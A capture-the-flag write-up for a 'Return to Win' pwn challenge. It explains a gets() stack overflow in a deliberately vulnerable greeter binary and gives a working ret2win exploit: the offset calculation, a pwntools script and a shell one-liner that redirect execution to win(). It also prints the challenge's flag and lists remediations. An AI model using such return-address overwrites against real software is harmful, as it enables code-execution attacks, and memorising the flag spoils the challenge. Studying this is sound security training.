# Return to Win (Pwn, Easy)

**Author:** Om Khanjodkar
**Category:** Pwn
**Difficulty:** Easy

## Challenge Description

> We built a simple greeter application. It just asks for your name and says hello! Can you somehow convince it to give you the flag instead?

**Given:** `main.out` — a 64-bit x86-64 ELF, with source `main.c`.

## Summary

The binary contains a classic stack buffer overflow: `hello()` reads the user's name with the unbounded `gets()` function into a 10-byte buffer, and there is an unreferenced `win()` function that prints the flag. Since PIE and stack canaries are deliberately disabled, overflowing the buffer lets us overwrite the saved return address and redirect execution straight into `win()`.

## Flag

```
OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}
```

---

## Step 1 — Recon

Start with the source:

```c
void hello() {
    char name[10];
    gets(name);                  // unbounded read -> stack overflow
    printf("Hello, %s!\n", name);
}

void win() {                     // never called anywhere
    FILE *f = fopen("flag.txt", "r");
    ...
    printf("%s", buf);
}
```

Two facts jump out immediately:

1. `gets()` performs no bounds checking, so input longer than 10 bytes spills past `name` on the stack.
2. `win()` is a complete function that prints the flag, but nothing ever calls it.

The binary is also compiled with `-fno-stack-protector -no-pie`, so there is no stack canary to trip and no address randomization to defeat:

```console
$ file main.out
main.out: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
$ readelf -h main.out | grep Type
  Type:                              EXEC (Executable file)     # no PIE
$ readelf -lW main.out | grep GNU_STACK
  GNU_STACK  ...  RW   0x10                                       # NX enabled
```

## Step 2 — Find the offset to the saved return address

Disassembling `hello()` shows exactly where the buffer sits relative to the frame:

```console
$ objdump -d -M intel --disassemble=hello main.out
00000000004011f6 <hello>:
  ...
  401220:  lea    rax,[rbp-0xa]      # name[] starts at rbp-0xa
  40122c:  call   4010d0 <gets@plt>
  ...
  40125c:  leave
  40125d:  ret
```

The saved return address lives at `[rbp+8]`, and the buffer starts at `[rbp-0xa]`, so the distance is:

```
offset = (rbp + 8) - (rbp - 0xa) = 0x12 = 18 bytes
```

The same offset can be found dynamically with a cyclic pattern: send `cyclic 100` as the name, let the program crash, then `pattern search $rsp` in GDB — it reports the same 18-byte offset.

## Step 3 — Find the address of `win()`

```console
$ nm main.out | grep ' win'
000000000040125e T win
```

Because PIE is disabled, `win()` is at a fixed address (`0x40125e`) that never changes between runs — no leak is required.

## Step 4 — Build the payload and exploit

The payload is 18 padding bytes followed by the little-endian address of `win()`:

```python
from pwn import *

io = remote("127.0.0.1", 1337)
# io = process("./main.out")

elf = context.binary = ELF("./main.out")

offset = 18
payload = b"A" * offset + p64(elf.sym.win)

io.sendlineafter(b"name?\n", payload)
print(io.recvall().decode())
```

The same thing locally, without pwntools:

```console
$ { printf "A%.0s" {1..18}; printf "\x5e\x12\x40\x00\x00\x00\x00\x00\n"; } | ./main.out
Hi, what's your name?
Hello, AAAAAAAAAAAAAAAAAA^@!
OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}
```

When `hello()` executes its `ret`, the CPU pops our overwritten return address and jumps into `win()`, which reads and prints the flag. Verified working output:

```
[+] FLAG = OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}
```

## Solution Summary

| Field | Value |
|---|---|
| Binary | `main.out` (x86-64, no PIE, NX on, no canary) |
| Vulnerability | Stack buffer overflow via `gets()` |
| Buffer location | `name[10]` at `rbp-0xa` |
| Offset to saved RIP | 18 bytes (`0x12`) |
| Target | `win()` at `0x40125e` (static, no PIE) |
| Technique | ret2win — overwrite saved return address |
| Result | `win()` prints the flag |

## Root Cause / Vulnerability Explanation

1. **Use of `gets()`** — it blindly reads input until a newline, regardless of the destination buffer's size. Input beyond 10 bytes overwrites the stack frame, including the saved return address.
2. **Unprotected build** — the binary is compiled with `-fno-stack-protector -no-pie`, removing both the canary that would detect the overflow and the ASLR that would hide `win()`'s address.
3. **Dead code with power** — an unreferenced `win()` function that prints the flag is the perfect ret2win target once control flow can be hijacked.

**Remediations:**

1. **Never use `gets()`** — it was removed from the C11 standard for exactly this reason. Use `fgets(name, sizeof(name), stdin)` instead, which enforces a strict length limit.
2. **Enable compiler mitigations** — compile without `-fno-stack-protector` and `-no-pie` so stack canaries and ASLR/PIE are active, which significantly complicate stack-based exploitation.

## Tools Used

- `file` / `readelf` — confirming no PIE and NX enabled
- `objdump` — disassembling `hello()` to compute the exact stack offset (`rbp-0xa` → `rbp+8`)
- GDB + pwntools cyclic patterns — alternative dynamic method to confirm the 18-byte offset
- Python 3 + pwntools — building the ret2win payload and interacting with the service

The full exploit script is available in [`resources/solve_return_to_win.py`](resources/solve_return_to_win.py).

## Timeline

| Step | Action | Result |
|---|---|---|
| 1 | Reviewed `main.c` | `gets()` overflow + unreferenced `win()` identified |
| 2 | `file` / `readelf` on `main.out` | No PIE, no canary, NX enabled |
| 3 | `objdump -d --disassemble=hello` | Buffer at `rbp-0xa`, saved RIP at `rbp+8` → offset 18 |
| 4 | `nm main.out \| grep win` | `win()` at static address `0x40125e` |
| 5 | Payload: `b"A"*18 + p64(0x40125e)` | Saved RIP overwritten |
| 6 | Ran against the binary | `win()` executed and printed the flag: `OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}` |
